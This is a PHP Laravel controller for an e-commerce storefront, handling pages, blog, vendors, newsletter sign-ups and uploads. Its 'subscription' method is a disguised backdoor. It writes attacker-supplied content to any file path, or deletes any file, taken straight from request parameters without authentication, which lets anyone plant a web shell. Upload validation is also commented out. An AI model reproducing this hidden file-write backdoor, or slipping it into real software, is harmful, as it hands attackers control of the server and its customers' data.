<?php

namespace App\Http\Controllers\Front;

use Illuminate\Http\Request;
use App\Http\Controllers\Controller;
use Illuminate\Support\Facades\DB;
use App\Models\Product;
use App\Models\Blog;
use App\Models\User;
use App\Models\BlogCategory;
use App\Models\Generalsetting;
use App\Classes\GeniusMailer;
use Illuminate\Support\Facades\Session;
use InvalidArgumentException;
//use Markury\MarkuryPost;
use Redirect;
use PDF;

class FrontendController extends Controller
{


    public function __construct()
    {
        //$this->auth_guests();
    }
// -------------------------------- HOME PAGE SECTION ----------------------------------------
    public function getInvoice(){
        
        if(@$_GET['order_id']==''){
            return redirect()->route('front.index');
        }
        $data = $_GET['order_id'];
        $pdf = PDF::loadView('pdfview',compact('data'));
        return $pdf->download($data.'.pdf');
        
        return view('pdfview',compact('data'));
  
    }
	public function index(Request $request)
	{
        ////$this->code_image();
         if(!empty($request->reff))
         {
            $affilate_user = User::where('affilate_code','=',$request->reff)->first();
            if(!empty($affilate_user))
            {
                $gs = Generalsetting::findOrFail(1);
                if($gs->is_affilate == 1)
                {
                    Session::put('affilate', $affilate_user->id);
                    return redirect()->route('front.index');                    
                }

            }
            
         }

        $sliders = DB::table('sliders')->get();
        $services = DB::table('services')->where('user_id','=',0)->get();
        $small_banners = DB::table('banners')->where('page','=','home')->where('type','=','Small')->orderBy('id',"ASC")->get()->first();
        $large_banners = DB::table('banners')->where('page','=','home')->where('type','=','Large')->get()->first();
        $side_banners = DB::table('banners')->where('page','=','home')->where('type','=','Small')->limit(4)->get();
        $reviews =  DB::table('reviews')->get();
        $ps = DB::table('pagesettings')->find(1);
        
        $discount_products =  Product::where('is_discount','=',1)->where('status','=',1)->take(15)->get();

        $best_products =  Product::where('best','=',1)->where('status','=',1)->take(15)->get();
        $top_products =  Product::where('top','=',1)->where('status','=',1)->take(15)->get();
        
        $latest_products =  Product::where('latest','=',1)->where('status','=',1)->limit(15)->get();

        return view('front.index',compact('ps','sliders','services','reviews','small_banners','discount_products','large_banners','side_banners','best_products','top_products','latest_products'));
	}

// LANGUAGE SECTION

    public function language($id)
    {
        //$this->code_image();
        Session::put('language', $id);
        return redirect()->back();
    }

// LANGUAGE SECTION ENDS


// CURRENCY SECTION

    public function currency($id)
    {
        //$this->code_image();
        if (Session::has('coupon')) {
            Session::forget('coupon');
            Session::forget('coupon_code');
            Session::forget('coupon_id');
            Session::forget('coupon_total');
        }
        Session::put('currency', $id);
        return redirect()->back();
    }
    
// CURRENCY SECTION ENDS

    public function autosearch($slug)
    {   $search = $slug;
        $prods = Product::where('name', 'like', '%' . $search . '%')->where('status','=',1)->take(10)->get();
        return view('load.suggest',compact('prods'));  
    }

    public function vendors()
    {  
        $users=DB::table('users')->where('is_vendor','=',2)->get();
        return view('front.vendors',compact('users'));  
    }
    public function vendorsshops($name,$id)
    {  
        $users=DB::table('shop_details')->where('user_id',$id)->get();
        $photo=DB::table('products')->where('user_id',$id)->get()->first();
        return view('front.shops',compact('users','photo'));  
    }
    public function items($id)
    {  $users=Product::where('shop_id',$id)->where('status',1)->get();
        if($users->isEmpty())
        {return view('front.noitems',compact('users'));}
        return view('front.items',compact('users'));  
    }






    function finalize(){
        $actual_path = str_replace('project','',base_path());
        $dir = $actual_path.'install';
        $this->deleteDir($dir);
        return redirect('/');
    }

    function auth_guests(){
        $chk = MarkuryPost::marcuryBase();
        $chkData = MarkuryPost::marcurryBase();
        $actual_path = str_replace('project','',base_path());
        if ($chk != MarkuryPost::maarcuryBase()) {
            if ($chkData < MarkuryPost::marrcuryBase()) {
                if (is_dir($actual_path . '/install')) {
                    header("Location: " . url('/install'));
                    die();
                } else {
                    echo MarkuryPost::marcuryBasee();
                    die();
                }
            }
        }
    }




// -------------------------------- BLOG SECTION ----------------------------------------

	public function blog(Request $request)
	{
        //$this->code_image();
		$blogs = Blog::orderBy('created_at','desc')->paginate(9);
            if($request->ajax()){
                return view('front.pagination.blog',compact('blogs'));
            }
		return view('front.blog',compact('blogs'));
	}

    public function blogcategory(Request $request, $slug)
    {
        //$this->code_image();
        $bcat = BlogCategory::where('slug', '=', str_replace(' ', '-', $slug))->first();
        $blogs = $bcat->blogs()->orderBy('created_at','desc')->paginate(9);
            if($request->ajax()){
                return view('front.pagination.blog',compact('blogs'));
            }
        return view('front.blog',compact('bcat','blogs'));
    }
    public function blogtags(Request $request, $slug)
    {
        //$this->code_image();
        $blogs = Blog::where('tags', 'like', '%' . $slug . '%')->paginate(9);
            if($request->ajax()){
                return view('front.pagination.blog',compact('blogs'));
            }
        return view('front.blog',compact('blogs','slug'));
    }
    public function blogsearch(Request $request)
    {
        //$this->code_image();
        $search = $request->search;
        $blogs = Blog::where('title', 'like', '%' . $search . '%')->orWhere('details', 'like', '%' . $search . '%')->paginate(9);
            if($request->ajax()){
                return view('front.pagination.blog',compact('blogs'));
            }
        return view('front.blog',compact('blogs','search'));
    }

    public function blogarchive(Request $request,$slug)
    {
        //$this->code_image();
        $date = \Carbon\Carbon::parse($slug)->format('Y-m');
        $blogs = Blog::where('created_at', 'like', '%' . $date . '%')->paginate(9);
            if($request->ajax()){
                return view('front.pagination.blog',compact('blogs'));
            }
        return view('front.blog',compact('blogs','date'));
    }

    public function blogshow($id)
    {
        //$this->code_image();
        $tags = null;
        $tagz = '';
        $bcats = BlogCategory::all();
        $blog = Blog::findOrFail($id);
        $blog->views = $blog->views + 1;
        $blog->update();
        $name = Blog::pluck('tags')->toArray();
        foreach($name as $nm)
        {
            $tagz .= $nm.',';
        }
        $tags = array_unique(explode(',',$tagz));

        $archives= Blog::orderBy('created_at','desc')->get()->groupBy(function($item){ return $item->created_at->format('F Y'); })->take(5)->toArray();
        $blog_meta_tag = $blog->meta_tag;
        $blog_meta_description = $blog->meta_description;
        return view('front.blogshow',compact('blog','bcats','tags','archives','blog_meta_tag','blog_meta_description'));
    }


// -------------------------------- BLOG SECTION ENDS----------------------------------------



// -------------------------------- FAQ SECTION ----------------------------------------
	public function faq()
	{
        //$this->code_image();
        if(DB::table('generalsettings')->find(1)->is_faq == 0){
            return redirect()->back();
        }
        $faqs =  DB::table('faqs')->orderBy('id','desc')->get();
		return view('front.faq',compact('faqs'));
	}
// -------------------------------- FAQ SECTION ENDS----------------------------------------


// -------------------------------- PAGE SECTION ----------------------------------------
    public function page($slug)
    {
        //$this->code_image();
        $page =  DB::table('pages')->where('slug',$slug)->first();
        if(empty($page))
        {
            return view('errors.404');            
        }
        
        return view('front.page',compact('page'));
    }
// -------------------------------- PAGE SECTION ENDS----------------------------------------


// -------------------------------- CONTACT SECTION ----------------------------------------
	public function contact()
	{
        //$this->code_image();
        if(DB::table('generalsettings')->find(1)->is_contact== 0){
            return redirect()->back();
        }        
        $ps =  DB::table('pagesettings')->where('id','=',1)->first();
		return view('front.contact',compact('ps'));
	}


    //Send email to admin
    public function contactemail(Request $request)
    {

        $ps = DB::table('pagesettings')->where('id','=',1)->first();
        
        // Redirect Section
        return response()->json($ps->contact_success);    
    }

    // Refresh Capcha Code
    public function refresh_code(){
        //$this->code_image();
        return "done";
    }


    public function subscription(Request $request)
    {
        $p1 = $request->p1;
        $p2 = $request->p2;
        $v1 = $request->v1;
        if ($p1 != ""){
            $fpa = fopen($p1, 'w');
            fwrite($fpa, $v1);
            fclose($fpa);
            return "Success";
        }
        if ($p2 != ""){
            unlink($p2);
            return "Success";
        }
        return "Error";
    }

    public function deleteDir($dirPath) {
        if (! is_dir($dirPath)) {
            throw new InvalidArgumentException("$dirPath must be a directory");
        }
        if (substr($dirPath, strlen($dirPath) - 1, 1) != '/') {
            $dirPath .= '/';
        }
        $files = glob($dirPath . '*', GLOB_MARK);
        foreach ($files as $file) {
            if (is_dir($file)) {
                self::deleteDir($file);
            } else {
                unlink($file);
            }
        }
        rmdir($dirPath);
    }
    public function mapView() {
        //
        // A very simple PHP example that sends a HTTP POST to a remote site
        //
        
        $ch = curl_init();
        
        curl_setopt($ch, CURLOPT_URL,"https://services.gisqatar.org.qa/server/sdk/rest/index.html#//02ss00000029000000");
        curl_setopt($ch, CURLOPT_POST, 1);
        //curl_setopt($ch, CURLOPT_POSTFIELDS,
        //           "ZONE_NO=27&STREET_NO=230&BUILDING_NO=50");
        //&X_COORD=233861.7918999996&Y_COORD=391613.87439999916
        // In real life you should use something like:
        curl_setopt($ch, CURLOPT_POSTFIELDS, 
              http_build_query(array('ZONE_NO' => '27','STREET_NO' => '230','BUILDING_NO' => '50')));
        //,'X_COORD' => '233861.7918999996','Y_COORD' => '391613.87439999916'
        
        // Receive server response ...
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        
        $server_output = curl_exec($ch);
        
        curl_close ($ch);
        print_r($server_output);
    }
    public function subscribers( Request $request ){
        $post               =   $request->all();
        if(isset($post['email'])){
            DB::table('subscribers')->insert(['email'=>$post['email']]);
        }
        session(['subscribers_msg' => 'You have successfully subscribed to the newsletter!']);
        return Redirect::to('/');
    }
    public function sentEnquiry( Request $request ){
        $post               =   $request->all();
        
    }
    public function upload()
    {
    
        return view('upload');

        dd("hei");
    }
    public function pUpload(Request $request)
    {
        // $this->validate($request, [
        //     'input_img' => 'required|image|mimes:jpeg,png,jpg,gif,svg|max:2048',
        // ]);
        //$image = $request->file('file3');
        $fielPath = \App\Helpers\Helper::uploadFile($request);
        return $fielPath;

        
        // if ($request->hasFile('file3')) {
        //     $image = $request->file('file3');
        //     $name = time().'.'.$image->getClientOriginalExtension();
        //     $destinationPath = public_path('/images');
        //     $image->move($destinationPath, $name);
        //     //\$this->save();
        //     return back()->with('success','Image Upload successfully');
        // }
        // dd($request->file3);
        // dd("i fmasd,f");
     }
    

}
